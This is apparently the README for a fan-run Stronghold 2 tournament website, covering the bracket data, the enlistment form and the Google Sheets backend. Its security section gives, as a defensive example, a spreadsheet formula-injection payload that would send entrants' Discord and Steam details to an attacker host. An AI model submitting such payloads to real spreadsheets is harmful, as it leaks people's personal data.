# The Hidden Cup — Stronghold 2

A Hidden-Cup-style tournament site for **Stronghold 2**: a sixteen-lord single-elimination 1v1
bracket where every lord competes behind an assigned heraldic alias, with the full ruleset, siege
recordings and open enlistment. Static site — no build step, no backend.

```
.nojekyll           tells Pages to skip the Jekyll build — serve the files as-is
index.html          the whole site (markup, styles, script, data)
assets/duel.jpg     hero — knight vs. axeman
assets/knight.jpg   "The Rule of the Mask" band
assets/berserker.jpg enlistment band
assets/mark.png     Stronghold 2 shield — brand mark and apple-touch-icon
assets/favicon.png  the same shield at 48px, for the tab
```

## Deploy to GitHub Pages

1. Push `index.html` **and the `assets/` folder** to the repository root.
2. **Settings → Pages**: Source = *Deploy from a branch*, Branch = `main`, folder = `/ (root)`.
3. Live at `https://<user>.github.io/<repo>/` within a minute or two.

`.nojekyll` matters: without it, Pages runs every branch deploy through Jekyll, which this site has
no use for. It is pure overhead, and it silently ignores any file or folder whose name starts with
`_`. Keep the file.

**If a deploy fails with `Error: Timeout reached, aborting!`** — that is the deploy step giving up
while waiting on the Pages API, not a problem with the site. Re-run the job from the **Actions**
tab first, and check [githubstatus.com](https://www.githubstatus.com) if it repeats. Size is not
the cause here: the whole site is well under 1 MB.

Paths are relative, so it also works from a project subpath.

**Opening `index.html` straight off disk mostly works, but the videos will not.** A `file://` page
has a null origin and sends no referrer, so YouTube refuses to embed and its player shows
*"Video player configuration error"*. The same null origin blocks the `fetch` that reads the pledge
count, so that stays hidden too. Neither is a fault in the page and neither can be fixed from
inside it — the recording modal detects `file://` and offers an **Open on YouTube** link instead of
a dead player. To see the real thing locally, serve the folder:

```sh
python3 -m http.server      # then open http://localhost:8000
```

## The masks

Identities are concealed by default. **Reveal identities** (above the bracket) flips the whole
site between the two states — bracket, recording modal and champion card all re-render:

The toggle covers the **main event only** — the qualifier table always shows real names, by design.

| | Concealed | Revealed |
|---|---|---|
| Bracket row | `The Gilded Lion` | `Lord_Aldric` / *as The Gilded Lion* |
| Pledge receipt | realm and date only | unchanged — it never shows a name either way |

Leave it concealed while the event runs; press it once the crown is settled.

## The bracket is a mock-up until you say otherwise

`TOURNAMENT.preview` is `true`. While it is:

- a **Showcase** notice sits above the bracket saying nothing below has been fought;
- the crown reads *Champion — example* instead of *Season I champion*;
- the toolbar button reads *Preview a siege recording*;
- the hero's stat strip stops counting the mock bracket. It reads
  **Enlisted · Format · Purse · Recordings** instead of **Lords · Sieges · Purse · Recordings**,
  because how many lords ride out is not known until enlistment closes. *Enlisted* is filled from
  `MUSTER_COUNT_URL` (see "Showing a total") and shows `—` without it.

The bracket itself renders exactly as it will on the day — that is the point of leaving it in.
Set `preview: false` once the real draw is written in, and all of it reverts on its own.

### The field is sixteen

The main event seats **sixteen lords**: Round of 16 → Quarter-Finals → Semi-Finals → Final, best
of five throughout, best of seven for the final and for the third-place siege. That is what the
shipped `rounds` array builds, and what the copy across the page now says.

The renderer is not tied to that number, so a different field only means editing `rounds` — eight
lords drop the Round of 16, thirty-two add a Round of 32 in front of it. Add the round, point the
previous round's `feeds` at its match ids, and column widths, connector lines and stat counters
adapt on their own — see "Add or remove rounds" below. No CSS to touch.

**The third-place siege** lives as the *second* match of the final round, not a round of its own.
Order matters: the champion card and the *Watch the final siege* button both read
`rounds[last].matches[0]`, so the final must stay first. It carries `feeds: null` and draws no
connector, because its two entrants are the semi-final *losers* and `feeds` only ever moves
winners.

## The qualifiers

Fought **openly, under real in-game names**. The mask starts at the main event: aliases are drawn
only once the field is settled, so nothing in the qualifiers needs concealing — and a big, followable
qualifier field is what draws a crowd in the first place.

They live in the `QUALIFIERS` object, separate from `TOURNAMENT`, and render as a table rather than
a bracket. That is deliberate: enlistment is uncapped, so the entrant count is unknown, and a table
copes with any number — odd fields, byes, a lord who withdraws — where a bracket needs a power of
two and hand-placed gaps.

```js
const QUALIFIERS = {
  window:   "Fri 18 – Sun 20 September",
  format:   "Best of 3",
  entrants: null,                 // total banners fought; null while unknown
  matches: [
    { id:"Q1", date:"18 Sep", status:"completed", winner:0,
      sides:[ {lord:"Lord_Aldric", score:2}, {lord:"Rook_of_Ely", score:1} ] },
    { id:"Q8", date:"20 Sep", status:"unfought", winner:null,
      sides:[ {lord:"HeronBlack",  score:0}, {lord:"Alder_Whitt", score:0} ] }
  ]
};
```

- `window` and `format` render as the section's eyebrow line.
- Same two states as the bracket — `"completed"` with a `winner`, or `"unfought"`. A decided row
  shows the score and a gold **Qualified** tag; an open one shows *Not yet fought* / **To come**.
- `entrants` only changes the summary line: set it and you get *"7 of 23 banners have won through"*;
  leave it `null` and you get *"7 of 8 sieges decided"*.
- An empty `matches: []` renders *"The draw is made when enlistment closes."* — that is the state to
  ship with until the real draw exists.
- Winners are **not** copied into `TOURNAMENT` automatically. Once the qualifiers are done, write the
  eight (or sixteen) `lord` names into the bracket by hand and assign the aliases then.

### Why no qualifier recordings

The page says qualifier VODs are held until after the unmasking, and that is a real rule, not
decoration. A public *result* with a name on it does not compromise the mask — the Hidden Cup model
has always had a publicly known field and a secret mapping. A public *tape* does: a few minutes of
watching someone's opening build order, hotkey rhythm and expansion timing is usually enough to pick
them out of eight aliases. Publish qualifier results as they happen; publish the recordings after
the crown is settled.

## The rulebook section

`#rules` — *Terms of the Siege* — is the organiser's ruleset written straight into the markup.
There is no data object behind it and no JavaScript touching it; edit the HTML when a rule
changes. It sits between "The Rule of the Mask" and the enlistment band, in a two-column
`.rules-grid` (`.span-2` makes a card full width):

| Card | What it holds |
| --- | --- |
| The series | 16 lords, Bo5 rounds, Bo7 final and third place, and the 150g No Market tiebreaker on HC Fox Mountain |
| Calling the terms | Coin flip for game one, loser picks afterwards; the four start-gold and three peace-time options |
| The map pool | The seven HC maps; Fox Mountain is flagged as the tiebreak field |
| Laws of the field | The five conduct rules and what breaking one costs |
| What you must bring | Game, patch, Discord, Discord streaming, connection |
| Player checklist | The before-a-series and after-a-series protocols, plus the two absolute nevers |
| The purse | $55 / $30 / $15 and the payment terms |

Three rules are deliberately repeated elsewhere rather than left only here, because they change
what a player does before they ever reach this section: the **assigned alias** and the **media
embargo** are creed items I and V in "The Rule of the Mask", the embargo again explains why the
bracket shows *Recording to come*, and the enlistment consent checkbox links back to `#rules`.

## Updating sieges, scores and recordings

Everything lives in the `TOURNAMENT` object at the top of the `<script>` block. The bracket,
connector lines, champion card and stat counters all rebuild from it.

```js
{
  id: "QF1",                    // unique; referenced by `feeds`
  label: "Siege I",
  date: "26 Sep",
  format: "Best of 5",
  venue: "Rocky Ford",          // shown in the recording modal
  status: "completed",          // "completed" | "unfought" — see below
  winner: 0,                    // 0 = top, 1 = bottom, null = undecided
  sides: [
    { alias: "The Gilded Lion", lord: "Lord_Aldric", seed: 1, score: 3 },
    { alias: "The Stag Errant", lord: "Erran_Hart",  seed: 8, score: 1 }
  ],
  video: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
  feeds: { match: "SF1", slot: 0 }   // victor goes to SF1, top slot; null for the final
}
```

- **Score a siege** — set both `score`s, `winner` to `0` or `1`, `status: "completed"` and the
  `video` URL, **all in one edit**. See "Two states, not four" below.
- **Advance a lord** — copy their `alias`/`lord`/`seed` into `sides[slot]` of the match named in
  `feeds`. Leave `alias: ""` for an undecided slot; it renders as *Awaiting a victor*.
- **Attach a recording** — any YouTube URL in `video`. Watch, `youtu.be`, `/shorts/`, `/live/`
  and `/embed/` forms are all converted to an embed automatically. A non-YouTube URL still works
  — the modal offers a link instead of a player. `video: ""` leaves the card unclickable.
- **Add or remove rounds** — add an entry to `rounds` (`name` + `sub` for the two-line header)
  and point the previous round's `feeds` at its match ids. Column widths and the connector lines
  adapt on their own.

If a video's owner has disabled embedding, YouTube renders its own *Watch on YouTube* button
inside the frame, and the modal's **Open on YouTube** link always works.

*"Video player configuration error"* is a different thing and almost always means the page was
opened off disk rather than served — see "Deploy to GitHub Pages" above. To tell them apart, check
whether the video is embeddable at all:

```sh
curl -s "https://www.youtube.com/oembed?url=YOUR_VIDEO_URL&format=json"
```

A JSON blob back means the video is fine and the problem is the origin; an error means embedding
is genuinely disabled for that video.

### Two states, not four

A siege is either **unfought** or **decided**, and the legend above the bracket says only that.
There is deliberately no *Under way* and no *Recording pending*: both would need updating on the
hour during an event, and neither survives contact with a real broadcast schedule.

**The media embargo drives the order of the edits.** No recording — the host's or a player's —
may be published until the whole tournament is over, so results and videos no longer arrive
together. Score sieges as they are reported and attach the recordings in a batch at the end:

```js
status: "unfought",  winner: null,  score: 0,   video: ""     // before the siege
status: "completed", winner: 1,     score: 3,   video: ""     // reported — "Recording to come"
status: "completed", winner: 1,     score: 3,   video: "https://youtu.be/…"   // after the cup
```

A decided siege with an empty `video` is therefore a normal, expected state, and the card's
footer says **Recording to come** instead of *Not yet fought*. What to avoid is the reverse — a
`video` on a siege still marked `unfought`, which hides a published recording behind a card that
claims nothing has been played.

`status: "live"` is gone, along with the pulsing pill and the *Recording* legend swatch.

## Enlistment form

Six things are asked for, five of them required:

| Field | Why |
|---|---|
| **In-game name** | who you actually are; never leaves the organisers |
| **Discord** | direct DMs on the day — the one channel that has to work |
| **Steam profile** | how the lobby invitation reaches you if Discord goes quiet |
| **Realm** | a clock, not a country — see below |
| **Standing** | seeding |
| Availability *(optional)* | evenings that suit you, anything else |

Two checkboxes are required alongside them: the ruleset, and confirmation that the unofficial
patch is installed. There is also a hidden `website` field — a honeypot, off-screen and out of the
tab order. A human always leaves it empty; `doPost` silently discards any submission that fills it.

**Nobody picks their own alias.** Aliases are drawn by lot once enlistment closes and written
into the `TOURNAMENT` data by hand, which is why the form does not ask for one — a self-chosen
banner is a tell, and the whole point is that the bracket gives nothing away.

There is no edition field — the Steam release is the only one that plays multiplayer — and no
e-mail, because the event runs on DMs, not on a mailbox someone checks the next morning.

Discord is validated as a handle (`lord_aldric`) or any `discord.com` link; Steam as a
`steamcommunity.com/id|profiles/…` URL, a bare vanity name, or a 17-digit SteamID64.

### Realm is a clock, not a map

The realm options are **UTC offset ranges wearing continent names**, because the field's only real
job is pairing lords whose evenings overlap. The names are what a visitor reads; the offsets are
what the auto-detect matches against and what you sort by.

| Realm | Offsets | Catches |
|---|---|---|
| The Americas | `-12 … -3` | Los Angeles, New York, São Paulo |
| Europe & Africa | `-2 … +3` | London, Berlin, Athens, Lagos |
| Asia & the Middle East | `+3:30 … +9` | Tehran, Dubai, Mumbai, Bangkok, Perth, Tokyo |
| Oceania & the Pacific | `+9:30 … +14` | Adelaide, Sydney, Auckland |

Kept **wide on purpose**: the community is small, so narrow bands would leave lords with nobody to
fight inside their own. Four realms is enough to keep a Californian from waiting on a Turk while
still giving most people a same-realm opponent.

**The realm is pre-selected from the visitor's own clock** (`getTimezoneOffset`), and the hint says
so — *"Your clock reads UTC+2, so we have chosen a realm for you"* — because a silently wrong realm
costs a real evening. It is a starting guess, never an override: a visitor who has already chosen
keeps their choice. Every offset a browser can report is covered, half-hour and quarter-hour ones
included (Tehran `+3:30`, India `+5:30`, Nepal `+5:45`, Adelaide `+9:30`, Chatham `+12:45`). If you
add or reshape a realm, keep the `data-lo`/`data-hi` ranges **contiguous** — a gap means that
visitor gets no pre-selection at all.

To pair for the qualifiers, sort the sheet by this column and match inside a realm first, only
crossing realms when one has an odd lord left over.

**The deadline is stated in Pacific time**, which on 13 September 2026 is **PDT** (`UTC-7`), not
PST — US summer time runs 8 March to 1 November. Note it lands on the *14th* in UTC, so the page
spells both out: *"23:59 Pacific (PDT) — that is Monday 14 September, 06:59 UTC."*

### The unofficial patch

Entrants must run the latest [Stronghold 2 Unofficial
Patch](https://github.com/B1naryVision/sh2-unofficial-patch/releases/latest) — it fixes a long list
of the crash bugs that end multiplayer games early. It appears twice in the enlistment
section: as a red-flagged **Required** notice above the form, and as a second mandatory checkbox
inside it (`#patched`), so no pledge can be submitted without confirming it.

It is deliberately *not* part of "The Rule of the Mask" — that creed is about concealment, and a
client requirement does not belong in it.

The site links to `/releases/latest`, so it never names a version that can go stale. The latest at
the time of writing was **v0.6.1** (8 August 2026).

### Recording the pledges

GitHub Pages serves static files only, so the form has to POST to something external. Two
constants near the top of the enlistment block in the `<script>` control it:

```js
const ENLIST_ENDPOINT = "";     // "" = demo, kept in this browser only
const ENLIST_FIELDS   = null;   // only a Google Form needs this
```

The body always goes out form-encoded rather than as JSON — deliberately. Form encoding is a
CORS-safelisted content type, so the browser sends no preflight `OPTIONS` request, which is the
thing that breaks both Apps Script and Google Forms. All three options below read it as-is.

---

#### Option A — a Google Form *(no code, but it cannot report failure)*

Your visitors never see the Google Form. They fill in the site's own form; the site posts their
answers into the Google Form behind the scenes, and the responses pile up in its **Responses**
tab and linked Sheet exactly as if they had used it directly.

**1. Build the form.** At [forms.new](https://forms.new), create seven questions, all of type
**Short answer** (use *Paragraph* for Availability). Order does not matter, but the names do —
these are what you will match up in step 4:

| # | Question title | Type |
|---|---|---|
| 1 | In-game name | Short answer |
| 2 | Discord | Short answer |
| 3 | Steam profile | Short answer |
| 4 | Realm | Short answer |
| 5 | Standing | Short answer |
| 6 | Availability | Paragraph |
| 7 | Patch confirmed | Short answer |

> **Leave every question optional and keep them all Short answer / Paragraph.** Do *not* use
> Multiple choice for Realm or Standing, and do not mark anything required. A Google Form
> silently rejects a submission that fails its own validation, and because the response is
> opaque (step 5) your site cannot tell — the pledge would vanish with no error. Your site
> already validates these fields properly before it sends.

**2. Turn off sign-in — the form will not work until you do.** *Settings → Responses* → turn
**Limit to 1 response** **off**, and set **Collect email addresses** to **Off** (not *Verified*).
Either one forces a Google sign-in, and an anonymous `POST` from your site is then rejected with
**HTTP 401** before it ever reaches your questions.

You can check this from a terminal without touching the form:

```sh
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  "https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse" \
  --data-urlencode "entry.1286080246=connection test"
```

`200` means anonymous submissions are accepted. `401` means sign-in is still required.

Turning email collection off also keeps the site honest: the enlistment form promises no e-mail
is asked for, and *Verified* mode would quietly record every entrant's Google address.

**3. Get the POST URL.** Click **Send → 🔗 link** and copy it. It looks like:

```
https://docs.google.com/forms/d/e/1FAIpQLSd_LONG_ID_HERE/viewform?usp=sf_link
```

Strip everything from `?` onward and change `viewform` to `formResponse`:

```
https://docs.google.com/forms/d/e/1FAIpQLSd_LONG_ID_HERE/formResponse
```

That is your `ENLIST_ENDPOINT`. **Opening it in a browser is not a test** — `formResponse`
accepts `POST` only. A `GET` bounces you to the `viewform` page if you are signed in, or to a
Google sign-in screen if you are not. Both are normal; neither says anything about whether the
endpoint works.

**4. Get the seven field ids.** Open the form's live `viewform` link and paste this into the
browser console:

```js
[...document.querySelectorAll('[data-params]')].forEach(el => {
  const m = el.dataset.params.match(/\[\d+,"(.*?)",.*?\[\[(\d+),/);
  if (m) console.log('entry.' + m[2], '=', m[1]);
});
```

It prints one line per question — `entry.1286080246 = In-game name` and so on.

> **Every question carries two different numbers, and only one of them works.** A `data-params`
> attribute looks like this:
>
> ```
> %.@.[370588859,"In-game name",null,0,[[1286080246,null,false,...]]]
>       ^ item id                          ^ entry id
> ```
>
> The **item id** comes first, sitting right before the readable title, so any regex that grabs
> "the number next to the question name" returns it — and it looks perfectly plausible. The
> **entry id** is the one nested inside the `[[...]]`, and it is the only one `formResponse`
> accepts. Post to an item id and Google answers `200`, records the response, and leaves every
> field blank. The regex above reads the title from the first position and the id from the
> nested one, so it cannot confuse them.

**5. Wire them up.** Back in [index.html](index.html), fill in both constants:

For reference, these were the working values for the test form "Stronghold 2 Hidden Cup Season I"
(the site has since moved to Option B, so `ENLIST_FIELDS` is now `null`):

```js
const ENLIST_ENDPOINT = "https://docs.google.com/forms/d/e/1FAIpQLSeSHY_pn7PQNQfKGbPqxKNpMYnBzOPgnN_9ldsZx-ep_ltklw/formResponse";
const ENLIST_FIELDS = {
  lord:     "entry.1286080246",   // In-game name
  discord:  "entry.507949899",    // Discord
  steam:    "entry.483828855",    // Steam profile
  region:   "entry.1082268323",   // Realm
  standing: "entry.1326004513",   // Standing
  notes:    "entry.1844075980",   // Availability
  patched:  "entry.1873893118"    // Patch confirmed
};
```

When you move to the real form, **swap the endpoint and the map together** — entry ids are unique
per form, so a new endpoint with the old ids posts seven blank responses.

Any key you leave out of the map is simply not sent — `at` (the browser timestamp) is omitted
above on purpose, because Google Forms stamps its own arrival time on every response.

**6. Test it.** Open the site, submit a pledge, then check the form's **Responses** tab. Then
click **Link to Sheets** to get a live spreadsheet you can sort for seeding.

**The one catch — and it is a sharp one.** Google's `formResponse` endpoint returns no CORS headers at all, so the
request has to be sent in `no-cors` mode. The browser delivers it, but hands your page an
*opaque* response it is not allowed to read — meaning **the site cannot tell whether a pledge
actually landed**. It always shows the success toast. The code detects a `docs.google.com/forms/`
URL and switches modes on its own, so there is nothing to configure, but be aware of the
trade-off: check the Responses tab now and then rather than trusting the toast, and if a lord
says they enlisted and is not in the sheet, believe them.

This is why the `curl` check in step 2 matters so much. A rejected pledge and an accepted one look
identical to the page — both show *"Your banner is pledged."* **Re-run that check after any change
to the form's settings; if it ever returns anything but `200`, set `ENLIST_ENDPOINT` back to `""`
until it is fixed.** A form that is visibly broken beats one that thanks people for pledges it
threw away.

#### If you get a 401 anyway

The form renders publicly and shows a Submit button to a signed-out visitor, yet refuses the
POST. This happened once on this project; the cause was **Limit to 1 response** being on.

Check, in this order: **Limit to 1 response** off → **Collect email addresses** Off (not
*Verified*) → **Restrict to users in your organisation**, which only appears on Google
**Workspace** accounts.

Do not waste time on these; they were ruled out by testing:

- **It is not the payload.** A POST carrying the exact hidden fields the page itself sends
  (`fvv`, `partialResponse`, `pageHistory`, `fbzx`, `submissionTimestamp`), with browser cookies,
  `User-Agent`, `Referer` and `Origin`, gets the same 401 as a bare one. Once the settings are
  right, a bare POST with nothing but `entry.*` values returns `200`.
- **It is not a wrong form id.** A nonexistent form answers `404`; a restricted one answers
  `401`. A 401 means the form was found and the refusal is about authorisation.
- **It is not the questions.** Optional Short answer / Paragraph questions never cause this.

**The ten-second test:** open the `viewform` link in a **private / incognito window**, signed
out, and submit it by hand. If Google asks you to sign in, the problem is entirely in the form's
settings and no site-side code will fix it.

---

#### Option B — Apps Script → a Sheet ✅ *(this is what the site currently uses)*

Slightly more setup, but the response is readable, so a failed pledge actually shows the visitor
an error instead of a false success. That is why the site was moved onto it. In a new Google
Sheet, *Extensions → Apps Script*:

```js
var HEADERS = ["Received", "In-game name", "Discord", "Steam profile",
               "Realm", "Standing", "Availability", "Patched"];
var MAXLEN   = 300;    // longest value accepted in any one field
var MAXROWS  = 2000;   // flood stop; raise it if you ever get near

// Trim, cap, and defuse anything Sheets would treat as a formula.
function clean(v) {
  v = String(v == null ? "" : v).trim().slice(0, MAXLEN);
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}

function doPost(e) {
  var p = e.parameter || {};
  if (p.website) return ContentService.createTextOutput("ok");   // honeypot tripped

  var sh = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0];
  if (sh.getLastRow() === 0) {
    sh.appendRow(HEADERS);
    sh.getRange(1, 1, 1, HEADERS.length).setFontWeight("bold");
    sh.setFrozenRows(1);
  }
  if (sh.getLastRow() > MAXROWS) return ContentService.createTextOutput("ok");

  var row = [new Date(), clean(p.lord), clean(p.discord), clean(p.steam),
             clean(p.region), clean(p.standing), clean(p.notes), clean(p.patched)];
  // Plain-text format BEFORE writing, or Sheets turns a 17-digit SteamID64
  // into a float and you get 7.65612E+16. See "Two traps" below.
  sh.getRange(sh.getLastRow() + 1, 1, 1, row.length)
    .setNumberFormats([["yyyy-mm-dd hh:mm:ss", "@", "@", "@", "@", "@", "@", "@"]])
    .setValues([row]);
  return ContentService.createTextOutput("ok");
}
```

##### Two traps, both hit on this project

**Steam IDs get destroyed by `appendRow`.** A SteamID64 is 17 digits, past the precision Sheets
keeps for numbers, so `76561198000000000` is stored as `7.65612E+16` — irreversibly. Every
entrant's Steam id would arrive unusable and you would not notice until you tried to send lobby
invites. Writing through `setNumberFormats(["@"])` first, as above, keeps them as text. **If your
sheet already has corrupted ids, they cannot be recovered — re-collect them.** You can also
belt-and-braces it in the sheet: select the Steam column → *Format → Number → Plain text*.

**The count is off by one without a header row.** `getLastRow()` counts rows, not entries. The
`doGet` below subtracts 1 for the header — if your sheet has no header, that silently reports one
pledge fewer than you have. The `doPost` above writes a header on the first run, which fixes it
and makes the sheet readable when you sort it for seeding.

*Deploy → New deployment → Web app*, execute as **Me**, access **Anyone**. Paste the `/exec` URL
into `ENLIST_ENDPOINT` and leave `ENLIST_FIELDS` as `null` — the script reads our own field names,
so there is no `entry.*` mapping to maintain.

**Why this one won.** A POST to `/exec` answers `302` and redirects to `script.googleusercontent.com`,
which a browser re-issues as a `GET`. Both hops carry `access-control-allow-origin: *`, so `fetch`
can read the final `200 ok` — unlike a Google Form, the page knows whether the pledge landed and
says so. Verified end to end: a `200` stores the pledge and thanks the visitor; a `500` or a
dropped connection restores the button and shows *"The rider did not get through."*

**Testing it from a terminal.** Use `--data`, and do **not** pass `-X POST`:

```sh
curl -sL -o /dev/null -w "%{http_code}\n" "YOUR_EXEC_URL" --data-urlencode "lord=connection test"
```

`-X POST` forces curl to keep POSTing through the `302`, and the redirect target answers `405` —
a browser converts to `GET` and gets `200`. That flag will make a perfectly healthy endpoint look
broken.

#### Option C — Formspree

Quickest of the three, e-mails you each pledge, free tier caps at 50 a month. Create a form and
paste its `https://formspree.io/f/YOUR_ID` URL into `ENLIST_ENDPOINT`. Leave `ENLIST_FIELDS`
as `null`. Nothing else changes.

---

Whichever you pick, the endpoint URL sits in public JavaScript, so anyone can POST to it. Apps
Script lets you drop obvious junk inside `doPost`; Formspree has reCAPTCHA on by default; a
Google Form has no protection at all beyond deleting bad rows. For a field this size, glancing
over the sheet is usually enough.

### Security of the Sheets link

**What the public URL is.** `ENLIST_ENDPOINT` sits in client-side JavaScript, so treat it as
public. It is a **write capability, not a secret**: verified by probing, a `GET` returns only the
count and ignores every parameter (`?range=A1:H100&all=true` still answers `6`), and the
deployment id is not the spreadsheet id — `docs.google.com/spreadsheets/d/<deployment id>` is a
`404`. Nobody can read the sheet, or reach any other file in your Drive, from the URL on the page.

**Three things that do deserve attention:**

**1. Formula injection — the one with real teeth.** Anything written into a cell that begins with
`=`, `+`, `-` or `@` can be interpreted as a formula. A pledge submitted with an in-game name of
`=IMPORTXML("https://evil.tld/?x="&CONCATENATE(B2:D99),"//a")` would fire *when you open the
sheet*, quietly shipping every entrant's Discord handle and Steam id to someone else's server. The
`clean()` helper above prefixes an apostrophe to any such value, which stores it as literal text.
Plain-text number formatting alone is not something to rely on here — do both.

**2. Anyone can write to it.** That is unavoidable for anonymous submission from a static page,
and it is the honest trade for not running a backend. Mitigations in place: a **honeypot** field
(`website`) that is off-screen and out of the tab order, so a human never fills it and a naive bot
usually does; a **length cap** per field; and a **row ceiling** that stops a flood from burning
your Apps Script daily quota, which would otherwise take real signups down with it. None of this
stops a determined human — for a community event of this size, watching the sheet is the answer.
If it is ever genuinely abused, the real fix is a Cloudflare Turnstile token verified inside
`doPost` via `UrlFetchApp`.

**3. "Execute as Me" means the script runs with your Google account's authority.** Today it only
touches its own bound spreadsheet, which is the right scope. Keep it that way — pin it in
`appsscript.json` so a later edit cannot silently widen it:

```json
{ "oauthScopes": ["https://www.googleapis.com/auth/spreadsheets.currentonly"] }
```

**Loose ends worth closing**

- The **old Google Form is still accepting anonymous responses** (a `POST` to its `formResponse`
  returns `302`). Nothing reads it any more, so it is an unattended inbox collecting whatever finds
  it. *Settings → Responses → Accepting responses* → off.
- Restrict who the **spreadsheet itself** is shared with. That is where the real exposure lives —
  in-game names, Discord handles and Steam ids together — and it is governed by Drive sharing, not
  by anything on this site.
- Never *Publish to web* the responses sheet. See "Showing a total" below for the safe way to
  expose a count.

### Showing a total

**The pledge block is a receipt, not a scoreboard.** It is headed *Your pledge* and reads from
`localStorage`, so each visitor sees only what they themselves submitted. It cannot show a site
-wide total: the pledges live in Google Forms, and a static page has no way to read them back.

If you want a real "N banners pledged" tally beside it, set `MUSTER_COUNT_URL` to something that
serves the number and nothing else. The same figure fills the hero's **Enlisted** tile while
`preview` is on, so one endpoint drives both — and a rising number on the front page is the whole
point of an uncapped enlistment. The badge stays hidden unless a real integer arrives — a
missing tally is honest, a stale or invented one is not.

> **Never point it at the responses sheet.** Publishing that to the web would expose every
> entrant's name, Discord handle and Steam id, and break the promise the form makes. Publish a
> count, never the rows.

`MUSTER_COUNT_URL` points at the Apps Script web app — the same `/exec` URL that receives the
pledges, so one deployment serves both. This is live and verified: a `GET` returns the row count
as `text/plain` with `access-control-allow-origin: *`, and posting a pledge takes the count up by
one. The `doGet` that does it:

```js
function doGet() {
  var rows = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0].getLastRow();
  return ContentService.createTextOutput(String(Math.max(0, rows - 1)))
                       .setMimeType(ContentService.MimeType.TEXT);
}
```

`rows - 1` skips the header row that `doPost` writes. **If your sheet has no header row, drop the
`- 1`** — otherwise the tally reads one short. Check it against the sheet the first time:
`curl -sL "YOUR_EXEC_URL"` should equal the number of entries you can see.

**Redeploying changes the URL if you create a new deployment** rather than a new *version* of the
existing one (*Deploy → Manage deployments → pencil → Version: New version*). Either is fine —
just remember the URL appears **twice** in [index.html](index.html), as `ENLIST_ENDPOINT` and
`MUSTER_COUNT_URL`. Change both together. Then check it:

```sh
curl -sL "YOUR_EXEC_URL"
```

It must print a number and nothing else.

**The page refuses anything that is not a number.** It reads the last non-empty line of the
response and requires it to be 1–7 digits. An HTML error page, a sign-in redirect or a CSV of the
real rows are all rejected and the tally simply stays hidden — because scraping digits out of an
error page would put an invented figure on the front page and in the hero.

**Alternative — a count-only published tab.** If you would rather not touch the script: in the
spreadsheet add a second sheet with `=COUNTA(Responses!A2:A)`, then *File → Share → **Publish to
web***, choosing **that sheet alone** (never *Entire document*) as CSV. Publishing the responses
sheet itself would expose every entrant's name, Discord and Steam id. Verify the browser is
allowed to read it before relying on it — this header has not been tested from here:

```sh
curl -sI "YOUR_PUBLISHED_CSV_URL" | grep -i access-control-allow-origin
```

**Alternative — by hand.** Replace the `loadPledgeCount()` body with
`$("#musterCount").textContent = "12 banners pledged"; $("#musterCount").hidden = false;` and edit
it when you feel like it. For a field this size that is a perfectly reasonable answer.

### One pledge per browser

A successful send is kept in `localStorage`, and on every later visit the form is **replaced by a
receipt** — *"Your banner is pledged"* — rather than offered again. The receipt echoes back only
the **realm** and the **date**; the name, Discord handle and Steam id are never rendered.

- **A failed send changes nothing.** The pledge is stored only after the endpoint returns a
  readable success, so a `500` or a dropped connection leaves the form filled in and visible with
  an error toast. This is the payoff for moving off Google Forms, which could not tell the
  difference.
- **"Something needs changing?"** puts the form back, prefilled from the stored pledge. Sending
  again *replaces* the local copy, so a browser never holds more than one — but the sheet keeps
  rows rather than updating them, so it will hold two. Dedupe on in-game name and keep the later
  row; the toast says as much to the visitor.
- **It is per-browser, not per-person.** A different browser, a private window or cleared site
  data all show the form again. This stops accidental double-sends, which is what it is for; it
  is not an identity check, and the sheet remains the source of truth.

Discord handles, Steam IDs and availability notes never render anywhere on the page at all. The
in-game name renders in exactly two places: **the qualifier table**, openly, as soon as a qualifier
result is entered; and **beside the alias in the bracket**, once **Reveal identities** is pressed.
That is what the form promises, so keep it: publish nothing else.

## Sample data — replace before you publish

Lord names, aliases, map names ("Rocky Ford", "King's Reach", …) and dates are invented
placeholders, not real Stronghold 2 multiplayer maps or players.

The seven sample recordings are real Stronghold 2 multiplayer footage from the **TheSettler**
YouTube channel — they show the player working rather than a placeholder. Several are team games
(2v2, 3v3) while the cup is 1v1, so swap them for your own VODs once the embargo lifts. The
Round of 16 and the third-place siege deliberately carry `video: ""`, so nine cards read
*Recording to come* — that is the state the bracket will actually sit in for most of the event.

The **map names are real**: every `venue` comes from the seven-map Hidden Cup pool, so those need
no replacing. Everything else in the data — lord names, aliases, scores, dates — is invented.

The `preview` flag covers the bracket, but the numbers written into the markup are *not* covered
by it: the **$100** purse and its $55 / $30 / $15 split, the sixteen-lord field, the gold and
peace-time options, and the whole "Terms of the Siege" section are hard-coded. Change them there
when the ruleset changes. (The schedule in "The Rule of the Mask" is real, and the showcase
bracket's siege dates were set to match its main-event weekends.)

## Artwork

`assets/mark.png` is the *Stronghold 2* shield icon, taken from the .ico on SteamGridDB
(`cdn2.steamgriddb.com/icon/fbb2edb68e804720ff2593eff56ae190.ico`) and re-saved as a 256px PNG.
It is Firefly's game icon, so the same caveat below applies to it.

The three photographs come from the official *Stronghold 2* press kit
(`fireflyworlds.com/press/Stronghold 2/images/artwork/`) and are © Firefly Studios. The footer
carries an attribution and an "unofficial, fan-run" disclaimer. Press-kit art is published for
editorial use — worth a quick check with Firefly before putting any of it, icon included, on a
public event site, especially anywhere near sponsorship or ticketing.

## Other bits

- Night / parchment theme toggle in the header, remembered per visitor.
- Responsive; the bracket scrolls horizontally on narrow screens.
- Keyboard accessible: siege cards are focusable, `Enter`/`Space` opens a recording,
  `Esc` closes the modal.
